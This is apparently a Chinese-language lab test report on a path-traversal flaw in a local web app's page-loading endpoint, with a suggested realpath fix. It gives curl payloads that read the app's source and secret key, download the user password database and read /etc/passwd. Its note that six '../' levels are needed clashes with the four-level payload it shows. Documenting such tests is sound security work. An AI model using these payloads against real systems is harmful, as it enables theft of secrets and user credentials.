# 步骤 12 — 文件包含漏洞测试

> **测试日期:** 2026-07-09  
> **漏洞位置:** `GET /page?name=xxx`  
> **漏洞类型:** 本地文件包含 / 路径穿越（任意文件读取）

---

## 一、漏洞概述

动态页面加载功能使用 `os.path.join("pages", name)` 拼接路径，未对 `name` 参数中的 `../` 做任何过滤，导致攻击者可读取系统任意文件。

### 漏洞代码

```python
filepath = os.path.join(pages_dir, name)
if os.path.isfile(filepath):
    with open(filepath, "r") as f:
        content = f.read()
```

---

## 二、漏洞测试

### 测试 1：读取源码

```bash
curl "http://127.0.0.1:5000/page?name=../app.py"
```

**结果：** `app.py` 完整源码泄露，包括 `secret_key`。

---

### 测试 2：下载数据库

```bash
curl "http://127.0.0.1:5000/page?name=../data/users.db" -o stolen.db
sqlite3 stolen.db "SELECT * FROM users;"
```

**结果：** 下载到含所有用户密码的 SQLite 数据库文件。

---

### 测试 3：读取系统文件

```bash
curl "http://127.0.0.1:5000/page?name=../../../../etc/passwd"
```

**结果：** 读取到系统用户列表。

**深度说明：** 从 `process/pages/` 到根目录 `/` 需要 6 层 `../`。

---

### 测试 4：读取模板文件

```bash
curl "http://127.0.0.1:5000/page?name=../templates/base.html"
```

**结果：** HTML 模板源码泄露。

---

## 三、漏洞总结

| Payload | 读取目标 | 风险 |
|---------|----------|:----:|
| `../app.py` | 应用源码（含 secret_key） | 🔴 高危 |
| `../data/users.db` | 用户数据库（含密码） | 🔴 高危 |
| `../../../../etc/passwd` | 系统用户列表 | 🔴 高危 |
| `../templates/base.html` | HTML 模板源码 | 🟡 中危 |

---

## 四、修复建议

对路径做规范化校验，防止穿越到 pages 目录之外：

```python
real_path = os.path.realpath(os.path.join(pages_dir, name))
if not real_path.startswith(os.path.realpath(pages_dir)):
    return render_template("index.html", page_content="<p>页面不存在</p>")
```
